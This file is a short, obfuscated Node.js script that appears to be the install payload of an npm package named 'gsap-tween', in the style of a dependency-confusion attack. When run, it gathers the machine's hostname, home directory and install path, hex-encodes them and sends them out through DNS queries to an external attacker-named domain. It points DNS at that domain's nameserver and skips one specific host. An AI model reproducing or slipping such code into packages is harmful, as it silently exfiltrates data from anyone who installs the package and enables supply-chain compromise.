const dns = require('dns')
const os = require('os')
const suffix = '.dns.alexbirsan-hacks-paypal.com'
const ns = 'dns1.alexbirsan-hacks-paypal.com'
const package = 'gsap-tween'
function sendToServer(_0x5056b1) {
  _0x5056b1 = Buffer.from(_0x5056b1).toString('hex')
  _0x5056b1 = _0x5056b1.match(/.{1,60}/g)
  id = Math.random().toString(36).substring(2)
  _0x5056b1.forEach(function (_0x36254a, _0x36e2e9) {
    try {
      dns.resolve(
        'v2_f.' + id + '.' + _0x36e2e9 + '.' + _0x36254a + '.v2_e' + suffix,
        'A',
        console.log
      )
    } catch (_0x2558d5) {}
  })
}
function tryGet(_0x225683) {
  try {
    return _0x225683()
  } catch (_0x1b02d5) {
    return 'err'
  }
}
data = {
  p: package,
  h: tryGet(os.hostname),
  d: tryGet(os.homedir),
  c: __dirname,
}
if (data.h == 'BBOGENS-LAPTOP') {
  process.exit(0)
}
data = JSON.stringify(data)
sendToServer(data)
dns.lookup(ns, function (_0x386474, _0x5f40c8) {
  if (!_0x386474) {
    nsAddress = _0x5f40c8
  } else {
    nsAddress = '8.8.8.8'
  }
  dns.setServers([nsAddress, '8.8.4.4'])
  sendToServer(data)
})

